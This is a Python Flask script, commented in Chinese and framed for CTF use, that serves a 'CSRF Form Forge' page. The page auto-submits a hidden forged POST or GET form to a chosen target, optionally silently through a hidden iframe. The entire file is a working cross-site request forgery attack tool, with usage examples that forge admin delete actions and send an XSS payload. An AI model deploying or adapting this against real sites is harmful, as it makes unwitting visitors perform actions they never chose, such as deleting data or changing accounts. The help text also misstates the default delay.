#!/usr/bin/env python3
"""
CSRF 表单伪造提交服务器
生成一个自动提交表单的 HTML 页面，用于伪造 POST/GET 请求。
常用于 CTF CSRF 攻击场景，将构造好的请求参数填入表单，
受害者在浏览器中打开页面后自动向目标地址提交请求。

支持两种模式：
  1. 自动提交模式（默认）：页面加载后自动提交表单
  2. 手动提交模式：显示按钮，需要用户点击提交
支持命令行参数配置
"""

import argparse
import sys
from flask import Flask, request, Response

app = Flask(__name__)

# 全局配置
TARGET_URL = ''
HTTP_METHOD = 'POST'
FORM_DATA = {}          # {field_name: field_value}
PORT = 8080
HOST = '0.0.0.0'
AUTO_SUBMIT = True
SUBMIT_DELAY = 500      # 自动提交延迟（毫秒），0 表示立即提交
ENCTYPE = 'application/x-www-form-urlencoded'
NEW_TAB = False         # 是否在新标签页中提交
DEBUG_NO_REDIRECT = False  # 调试模式：提交后不跳转，留在当前页

HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0d1117;
            color: #c9d1d9;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        .container {{
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 32px;
            max-width: 520px;
            width: 90%;
            box-shadow: 0 8px 24px rgba(0,0,0,0.4);
        }}
        h1 {{
            font-size: 1.4rem;
            color: #f0883e;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }}
        .subtitle {{
            color: #8b949e;
            font-size: 0.85rem;
            margin-bottom: 24px;
            border-bottom: 1px solid #21262d;
            padding-bottom: 16px;
        }}
        .info-row {{
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            padding: 6px 0;
            font-size: 0.85rem;
        }}
        .info-label {{
            color: #8b949e;
            flex-shrink: 0;
            margin-right: 12px;
        }}
        .info-value {{
            color: #58a6ff;
            word-break: break-all;
            text-align: right;
            font-family: 'SF Mono', 'Cascadia Code', 'Consolas', monospace;
            font-size: 0.8rem;
        }}
        .params-table {{
            width: 100%;
            border-collapse: collapse;
            margin: 16px 0;
            font-size: 0.82rem;
        }}
        .params-table th {{
            text-align: left;
            color: #8b949e;
            font-weight: 600;
            padding: 8px 12px;
            border-bottom: 1px solid #21262d;
            font-size: 0.78rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }}
        .params-table td {{
            padding: 6px 12px;
            border-bottom: 1px solid #21262d;
            font-family: 'SF Mono', 'Cascadia Code', 'Consolas', monospace;
            font-size: 0.8rem;
        }}
        .params-table td:first-child {{
            color: #7ee787;
        }}
        .params-table td:last-child {{
            color: #a5d6ff;
            word-break: break-all;
        }}
        .status {{
            margin-top: 20px;
            padding: 12px 16px;
            border-radius: 8px;
            font-size: 0.85rem;
            text-align: center;
        }}
        .status.pending {{
            background: #1a2332;
            border: 1px solid #1f6feb;
            color: #58a6ff;
        }}
        .status.sent {{
            background: #1a2a1a;
            border: 1px solid #238636;
            color: #7ee787;
        }}
        .status.error {{
            background: #2a1a1a;
            border: 1px solid #da3633;
            color: #f85149;
        }}
        .btn {{
            display: inline-block;
            padding: 10px 24px;
            border: 1px solid #30363d;
            border-radius: 6px;
            background: #21262d;
            color: #c9d1d9;
            cursor: pointer;
            font-size: 0.9rem;
            font-family: inherit;
            transition: all 0.15s;
            text-decoration: none;
        }}
        .btn:hover {{
            background: #30363d;
            border-color: #8b949e;
        }}
        .btn.primary {{
            background: #238636;
            border-color: #2ea043;
            color: #fff;
        }}
        .btn.primary:hover {{
            background: #2ea043;
        }}
        .btn-row {{
            margin-top: 20px;
            display: flex;
            gap: 10px;
            justify-content: center;
        }}
        .countdown {{
            color: #f0883e;
            font-weight: 600;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>&#x1f4a3; CSRF Form Forge</h1>
        <p class="subtitle">自动构造并提交 HTTP 请求 — 用于 CTF CSRF 攻击场景</p>

        <div class="info-row">
            <span class="info-label">目标地址</span>
            <span class="info-value">{target_url}</span>
        </div>
        <div class="info-row">
            <span class="info-label">请求方法</span>
            <span class="info-value">{method}</span>
        </div>
        <div class="info-row">
            <span class="info-label">编码类型</span>
            <span class="info-value">{enctype}</span>
        </div>

        <table class="params-table">
            <thead>
                <tr>
                    <th>参数名</th>
                    <th>参数值</th>
                </tr>
            </thead>
            <tbody>
                {params_rows}
            </tbody>
        </table>

        <div id="status" class="status pending">
            {status_text}
        </div>

        {form_html}

        <div class="btn-row">
            {buttons}
        </div>
    </div>

    {script}
</body>
</html>'''


def build_params_rows():
    """生成参数表格的 HTML 行"""
    if not FORM_DATA:
        return '<tr><td colspan="2" style="color:#8b949e;text-align:center;padding:16px;">（无参数）</td></tr>'
    rows = []
    for key, value in FORM_DATA.items():
        rows.append(f'            <tr><td>{escape_html(key)}</td><td>{escape_html(value)}</td></tr>')
    return '\n'.join(rows)


def build_form_fields():
    """生成表单隐藏字段的 HTML"""
    if not FORM_DATA:
        return ''
    fields = []
    for key, value in FORM_DATA.items():
        fields.append(f'        <input type="hidden" name="{escape_attr(key)}" value="{escape_attr(value)}">')
    return '\n'.join(fields)


def escape_html(s):
    """HTML 转义"""
    return (s
            .replace('&', '&amp;')
            .replace('<', '&lt;')
            .replace('>', '&gt;')
            .replace('"', '&quot;')
            .replace("'", '&#39;'))


def escape_attr(s):
    """属性值转义"""
    return s.replace('&', '&amp;').replace('"', '&quot;').replace('<', '&lt;')


def build_auto_submit_script():
    """生成自动提交的 JavaScript"""
    if not AUTO_SUBMIT:
        return ''

    new_tab_js = ''
    if NEW_TAB:
        # 在新标签页提交：修改 form target
        new_tab_js = '''
            form.setAttribute('target', '_blank');'''

    no_redirect_js = ''
    if DEBUG_NO_REDIRECT:
        # 用 iframe 提交，避免页面跳转
        return f'''    <script>
        (function() {{
            // 使用隐藏 iframe 提交，避免页面跳转
            var iframe = document.createElement('iframe');
            iframe.name = 'csrf-target';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);

            var form = document.getElementById('csrf-form');
            form.setAttribute('target', 'csrf-target');

            var countdown = {SUBMIT_DELAY};
            var statusEl = document.getElementById('status');
            var countdownEl = document.getElementById('countdown');

            function doSubmit() {{
                statusEl.textContent = '\\u2714 请求已通过 iframe 发送（页面不跳转）';
                statusEl.className = 'status sent';
                form.submit();
            }}

            if (countdown > 0) {{
                var timer = setInterval(function() {{
                    if (countdown <= 0) {{
                        clearInterval(timer);
                        doSubmit();
                    }} else {{
                        countdownEl.textContent = countdown + 'ms';
                        countdown -= 10;
                    }}
                }}, 10);
            }} else {{
                doSubmit();
            }}
        }})();
    </script>'''

    if SUBMIT_DELAY > 0:
        return f'''    <script>
        (function() {{
            var countdown = {SUBMIT_DELAY};
            var statusEl = document.getElementById('status');
            var countdownEl = document.getElementById('countdown');
            var form = document.getElementById('csrf-form');{new_tab_js}

            var timer = setInterval(function() {{
                if (countdown <= 0) {{
                    clearInterval(timer);
                    statusEl.textContent = '\\u2714 请求已发送！';
                    statusEl.className = 'status sent';
                    form.submit();
                }} else {{
                    countdownEl.textContent = countdown + 'ms';
                    countdown -= 10;
                }}
            }}, 10);
        }})();
    </script>'''

    # 无延迟：立即提交
    return f'''    <script>
        (function() {{
            var form = document.getElementById('csrf-form');{new_tab_js}
            var statusEl = document.getElementById('status');
            statusEl.textContent = '\\u2714 请求已发送！';
            statusEl.className = 'status sent';
            form.submit();
        }})();
    </script>'''


def build_status_text():
    """生成状态区文字"""
    if not AUTO_SUBMIT:
        return '⏸ 手动模式 — 请点击下方按钮提交请求'
    if SUBMIT_DELAY > 0:
        return f'⏳ 将在 <span id="countdown" class="countdown">{SUBMIT_DELAY}ms</span> 后自动提交...'
    return '🚀 页面加载后立即提交...'


def build_buttons():
    """生成按钮 HTML"""
    buttons = []
    if not AUTO_SUBMIT or SUBMIT_DELAY > 0:
        buttons.append(
            '<button class="btn primary" onclick="document.getElementById(\'csrf-form\').submit();'
            'this.textContent=\'\\u2714 已提交\';'
            'document.getElementById(\'status\').textContent=\'\\u2714 请求已手动发送！\';'
            'document.getElementById(\'status\').className=\'status sent\';">'
            '立即提交</button>'
        )
    # "在新标签页打开"链接 — 用 GET 方式打开目标
    if HTTP_METHOD.upper() == 'GET' and FORM_DATA:
        buttons.append(
            f'<a class="btn" href="{escape_attr(TARGET_URL)}" target="_blank">'
            '在新标签页打开</a>'
        )
    if not buttons:
        buttons.append(
            '<button class="btn primary" type="submit" form="csrf-form">'
            '重新提交</button>'
        )
    return '\n            '.join(buttons)


def build_form_html():
    """生成表单 HTML"""
    method = HTTP_METHOD.upper()
    fields = build_form_fields()
    target = TARGET_URL if NEW_TAB else ''  # new_tab 模式下 target 由 JS 设置

    return f'''        <form id="csrf-form"
              action="{escape_attr(TARGET_URL)}"
              method="{method.lower()}"
              enctype="{escape_attr(ENCTYPE)}"
              style="display:none;">
{fields}
        </form>'''


@app.route('/')
def index():
    """渲染自动提交表单页面"""
    html = HTML_TEMPLATE.format(
        title='CSRF Form Forge',
        target_url=escape_html(TARGET_URL),
        method=HTTP_METHOD.upper(),
        enctype=ENCTYPE,
        params_rows=build_params_rows(),
        status_text=build_status_text(),
        form_html=build_form_html(),
        buttons=build_buttons(),
        script=build_auto_submit_script(),
    )
    return html


@app.route('/health', methods=['GET', 'HEAD'])
def health():
    """健康检查端点"""
    return {
        'status': 'ok',
        'target_url': TARGET_URL,
        'method': HTTP_METHOD.upper(),
        'form_data': FORM_DATA,
        'auto_submit': AUTO_SUBMIT,
        'submit_delay': SUBMIT_DELAY,
        'mode': 'auto' if AUTO_SUBMIT else 'manual',
    }, 200


@app.route('/config', methods=['GET'])
def config():
    """查看当前配置（调试用）"""
    return {
        'target_url': TARGET_URL,
        'method': HTTP_METHOD.upper(),
        'form_data': FORM_DATA,
        'enctype': ENCTYPE,
        'auto_submit': AUTO_SUBMIT,
        'submit_delay_ms': SUBMIT_DELAY,
        'new_tab': NEW_TAB,
        'debug_no_redirect': DEBUG_NO_REDIRECT,
        'host': HOST,
        'port': PORT,
    }


def parse_args():
    """解析命令行参数"""
    parser = argparse.ArgumentParser(
        description='CSRF 表单伪造提交服务器 — 生成自动提交 POST/GET 表单',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例：
  # 基础用法：向目标发送 POST 请求，携带指定参数
  python forge_submit.py -t https://example.com/api -d user=admin action=delete

  # GET 请求
  python forge_submit.py -t https://example.com/search -m GET -d q=test page=1

  # 手动模式（不自动提交，需点击按钮）
  python forge_submit.py -t https://example.com/api -d token=abc --manual

  # 3 秒延迟自动提交
  python forge_submit.py -t https://example.com/api -d user=admin --delay 3000

  # 在新标签页中提交（不影响当前页面）
  python forge_submit.py -t https://example.com/api -d payload=xss --new-tab

  # 调试模式：iframe 无声提交，不跳转页面
  python forge_submit.py -t https://example.com/api -d key=val --debug-no-redirect

  # multipart/form-data 编码（文件上传场景）
  python forge_submit.py -t https://example.com/upload -d filename=test.txt -e multipart/form-data

  # 指定端口和监听地址
  python forge_submit.py -t https://example.com/api -d user=admin -p 9000 --host 127.0.0.1
        """
    )

    parser.add_argument(
        '-t', '--target',
        dest='target_url',
        help='目标请求 URL（例如：https://example.com/api/endpoint）',
        default=None,
    )

    parser.add_argument(
        '-d', '--data',
        dest='form_data',
        nargs='+',
        default=[],
        help='表单数据，格式 key=value（可多个，空格分隔）',
    )

    parser.add_argument(
        '-m', '--method',
        dest='method',
        choices=['GET', 'POST'],
        default='POST',
        help='HTTP 请求方法（默认：POST）',
    )

    parser.add_argument(
        '-e', '--enctype',
        dest='enctype',
        default='application/x-www-form-urlencoded',
        help='表单编码类型（默认 application/x-www-form-urlencoded，也可用 multipart/form-data 或 text/plain）',
    )

    parser.add_argument(
        '-p', '--port',
        dest='port',
        type=int,
        default=8080,
        help='监听端口（默认：8080）',
    )

    parser.add_argument(
        '--host',
        dest='host',
        default='0.0.0.0',
        help='监听地址（默认：0.0.0.0 表示所有接口）',
    )

    parser.add_argument(
        '--delay',
        dest='delay',
        type=int,
        default=0,
        help='自动提交前的延迟时间，单位毫秒（默认：500ms，设为 0 立即提交）',
    )

    parser.add_argument(
        '--manual',
        dest='manual',
        action='store_true',
        help='手动模式：不自动提交，需要用户点击按钮',
    )

    parser.add_argument(
        '--new-tab',
        dest='new_tab',
        action='store_true',
        help='在新标签页中提交表单（不影响当前页面）',
    )

    parser.add_argument(
        '--debug-no-redirect',
        dest='debug_no_redirect',
        action='store_true',
        help='调试模式：通过隐藏 iframe 提交，提交后页面不跳转（方便查看结果）',
    )

    parser.add_argument(
        '--debug',
        dest='debug',
        action='store_true',
        help='启用 Flask 调试模式（热重载 + 详细错误）',
    )

    return parser.parse_args()


def parse_form_data(raw_data):
    """解析 key=value 格式的表单数据"""
    result = {}
    for item in raw_data:
        if '=' not in item:
            print(f"⚠️  警告：忽略无效参数 '{item}'（格式应为 key=value）", file=sys.stderr)
            continue
        key, _, value = item.partition('=')
        result[key] = value
    return result


def load_config_from_env():
    """从环境变量加载配置"""
    import os
    env_data = os.environ.get('FORM_DATA', '')
    parsed = {}
    if env_data:
        for pair in env_data.split(','):
            pair = pair.strip()
            if '=' in pair:
                k, _, v = pair.partition('=')
                parsed[k.strip()] = v.strip()

    return {
        'target_url': os.environ.get('TARGET_URL'),
        'method': os.environ.get('HTTP_METHOD', 'POST'),
        'form_data': parsed,
        'port': int(os.environ.get('PORT', 8080)),
        'host': os.environ.get('HOST', '0.0.0.0'),
        'auto_submit': os.environ.get('AUTO_SUBMIT', 'true').lower() == 'true',
        'submit_delay': int(os.environ.get('SUBMIT_DELAY', 500)),
        'enctype': os.environ.get('ENCTYPE', 'application/x-www-form-urlencoded'),
    }


def validate_target_url(url):
    """验证目标 URL 是否有效"""
    if not url:
        print("❌ 错误：未指定目标 URL", file=sys.stderr)
        print("   请使用 -t 参数或设置 TARGET_URL 环境变量", file=sys.stderr)
        print("   例如：python forge_submit.py -t https://example.com/api -d user=admin", file=sys.stderr)
        sys.exit(1)

    if not (url.startswith('http://') or url.startswith('https://')):
        print(f"⚠️  警告：目标 URL 缺少协议，自动添加 https://", file=sys.stderr)
        url = 'https://' + url

    return url


def main():
    """主函数"""
    # 1. 解析命令行参数
    args = parse_args()

    # 2. 从环境变量加载
    env_config = load_config_from_env()

    # 3. 合并配置（命令行 > 环境变量）
    global TARGET_URL, HTTP_METHOD, FORM_DATA, PORT, HOST
    global AUTO_SUBMIT, SUBMIT_DELAY, ENCTYPE, NEW_TAB, DEBUG_NO_REDIRECT

    TARGET_URL = args.target_url or env_config.get('target_url') or ''
    TARGET_URL = validate_target_url(TARGET_URL)

    HTTP_METHOD = args.method or env_config.get('method', 'POST')
    PORT = args.port or env_config.get('port', 8080)
    HOST = args.host or env_config.get('host', '0.0.0.0')
    ENCTYPE = args.enctype or env_config.get('enctype', 'application/x-www-form-urlencoded')

    # 解析表单数据：命令行 > 环境变量
    if args.form_data:
        FORM_DATA = parse_form_data(args.form_data)
    elif env_config.get('form_data'):
        FORM_DATA = env_config['form_data']
    else:
        FORM_DATA = {}

    # 自动提交 vs 手动
    AUTO_SUBMIT = not args.manual
    SUBMIT_DELAY = args.delay
    NEW_TAB = args.new_tab
    DEBUG_NO_REDIRECT = args.debug_no_redirect

    if args.manual and args.delay != 500:
        print("⚠️  警告：--manual 模式下 --delay 无效", file=sys.stderr)

    # 4. 显示配置
    print("=" * 60)
    print("💣  CSRF 表单伪造提交服务器")
    print("=" * 60)
    print(f"📌 目标 URL:     {TARGET_URL}")
    print(f"📤 请求方法:     {HTTP_METHOD.upper()}")
    print(f"📋 编码类型:     {ENCTYPE}")
    print(f"🤖 提交模式:     {'自动' if AUTO_SUBMIT else '手动（需点击按钮）'}")
    if AUTO_SUBMIT:
        print(f"⏱  提交延迟:     {SUBMIT_DELAY}ms" + ("（立即）" if SUBMIT_DELAY == 0 else ""))
    if NEW_TAB:
        print(f"🪟 新标签页:     是")
    if DEBUG_NO_REDIRECT:
        print(f"🐛 静默提交:     是（iframe 方式，不跳转）")
    print(f"📦 表单字段:     {len(FORM_DATA)} 个")
    for k, v in FORM_DATA.items():
        print(f"   └─ {k} = {v}")
    print(f"🌐 监听地址:     {HOST}:{PORT}")
    print("=" * 60)
    host_display = HOST if HOST != '0.0.0.0' else 'localhost'
    print(f"📍 伪造页面:     http://{host_display}:{PORT}/")
    print(f"⚙️  配置查看:     http://{host_display}:{PORT}/config")
    print(f"❤️  健康检查:     http://{host_display}:{PORT}/health")
    print("=" * 60)
    print("按 Ctrl+C 停止服务器")
    print()

    # 5. 启动服务器
    try:
        app.run(host=HOST, port=PORT, debug=args.debug)
    except OSError as e:
        if "Address already in use" in str(e) or "10048" in str(e):
            print(f"❌ 错误：端口 {PORT} 已被占用，请使用 -p 指定其他端口", file=sys.stderr)
        else:
            print(f"❌ 错误：{e}", file=sys.stderr)
        sys.exit(1)


if __name__ == '__main__':
    main()
